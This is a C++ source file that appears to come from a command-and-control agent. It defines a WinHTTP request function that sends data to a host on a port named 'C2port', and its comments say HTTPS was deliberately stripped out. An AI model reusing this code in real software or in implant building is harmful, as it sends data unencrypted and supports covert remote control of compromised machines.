#include "functions.h"


namespace network {
    std::wstring MakeHttpRequest(const std::wstring& host,
        const std::wstring& path,
        const std::string& data,
        const std::wstring& method,
        const std::wstring& contentType = L"application/json") {
        HINTERNET hSession = WinHttpOpen(L"Agent/1.0",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return L"";

        // Use HTTP instead of HTTPS
        HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(),
            C2port, 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            return L"";
        }

        // Remove WINHTTP_FLAG_SECURE
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, method.c_str(), path.c_str(),
            nullptr, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0);  // No security flags

        // Add proper HTTP/1.1 headers
        std::wstring header_str =
            L"Content-Type: " + contentType + L"\r\n"
            L"Accept: application/json\r\n"
            L"Cache-Control: no-cache\r\n";

        if (!WinHttpAddRequestHeaders(hRequest, header_str.c_str(),
            -1, WINHTTP_ADDREQ_FLAG_ADD)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return L"";
        }

        // Send request
        std::string response_bytes;
        if (WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            (LPVOID)data.data(), data.size(),
            data.size(), 0))
        {
            WinHttpReceiveResponse(hRequest, nullptr);

            DWORD size = 0;
            do {
                size = 0;
                WinHttpQueryDataAvailable(hRequest, &size);
                if (size > 0) {
                    std::vector<char> buffer(size);
                    DWORD downloaded;
                    WinHttpReadData(hRequest, buffer.data(), size, &downloaded);
                    response_bytes.append(buffer.data(), downloaded);
                }
            } while (size > 0);
        }

        // Cleanup
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        return misc::UTF8ToWideString(response_bytes);
    }
}